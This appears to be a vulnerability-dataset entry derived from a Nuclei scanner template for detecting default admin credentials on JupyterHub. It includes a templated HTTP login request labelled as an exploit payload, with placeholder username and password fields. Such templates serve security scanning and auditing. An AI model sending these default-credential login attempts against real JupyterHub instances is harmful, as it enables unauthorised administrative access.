# Vulnerability: Jupyterhub - Default Admin Discovery
**Classification:** CWE-522
**Source:** Nuclei Template (`jupyterhub-default-login.yaml`)

## Description
Jupyterhub default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /hub/login?next= HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}
```

